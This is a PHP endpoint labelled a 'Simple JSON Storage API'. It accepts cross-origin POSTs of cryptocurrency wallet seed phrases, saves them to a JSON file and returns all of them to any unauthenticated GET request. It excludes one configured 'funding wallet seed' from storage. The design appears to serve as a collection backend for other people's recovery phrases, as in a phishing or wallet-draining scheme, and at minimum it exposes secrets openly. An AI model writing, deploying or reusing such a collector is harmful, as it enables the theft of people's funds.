<?php
/**
 * Simple JSON Storage API
 * Compatible with PHP 8.1+
 *
 * Endpoints:
 *   POST /wallets-api.php - Store wallets (filters out specific seed)
 *   GET  /wallets-api.php - Retrieve stored wallets
 *
 * Update the constants CLOUD_API_URL to point to where this script is running
 */

declare(strict_types=1);

// Configuration
const STORAGE_FILE = __DIR__ . '/wallets.json';
const FILTERED_SEED = '\{ insert the funding wallet seed phrase here \}';

// CORS headers - allow cross-origin requests
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Accept');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

// Set JSON response header
header('Content-Type: application/json');

/**
 * Load wallets from storage file
 */
function loadWallets(): array
{
    if (!file_exists(STORAGE_FILE)) {
        return [];
    }

    $content = file_get_contents(STORAGE_FILE);
    if ($content === false) {
        return [];
    }

    $data = json_decode($content, true);
    return is_array($data) ? $data : [];
}

/**
 * Save wallets to storage file
 */
function saveWallets(array $wallets): bool
{
    $json = json_encode($wallets, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    return file_put_contents(STORAGE_FILE, $json) !== false;
}

/**
 * Filter out wallets with the forbidden seed phrase
 */
function filterWallets(array $wallets): array
{
    return array_values(array_filter($wallets, function (array $wallet): bool {
        $seed = $wallet['seedWords'] ?? '';
        return strtolower(trim($seed)) !== strtolower(FILTERED_SEED);
    }));
}

/**
 * Handle POST request - store wallets
 */
function handlePost(): void
{
    $input = file_get_contents('php://input');

    if (empty($input)) {
        http_response_code(400);
        echo json_encode(['error' => 'Empty request body']);
        return;
    }

    $wallets = json_decode($input, true);

    if (json_last_error() !== JSON_ERROR_NONE) {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid JSON: ' . json_last_error_msg()]);
        return;
    }

    if (!is_array($wallets)) {
        http_response_code(400);
        echo json_encode(['error' => 'Expected JSON array']);
        return;
    }

    // Filter out the forbidden seed
    $filtered = filterWallets($wallets);

    if (!saveWallets($filtered)) {
        http_response_code(500);
        echo json_encode(['error' => 'Failed to save data']);
        return;
    }

    $removedCount = count($wallets) - count($filtered);

    echo json_encode([
        'success' => true,
        'stored' => count($filtered),
        'filtered' => $removedCount
    ]);
}

/**
 * Handle GET request - retrieve wallets
 */
function handleGet(): void
{
    $wallets = loadWallets();
    echo json_encode($wallets);
}

// Route request by method
$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';

match ($method) {
    'POST' => handlePost(),
    'GET' => handleGet(),
    default => (function () {
        http_response_code(405);
        echo json_encode(['error' => 'Method not allowed']);
    })()
};
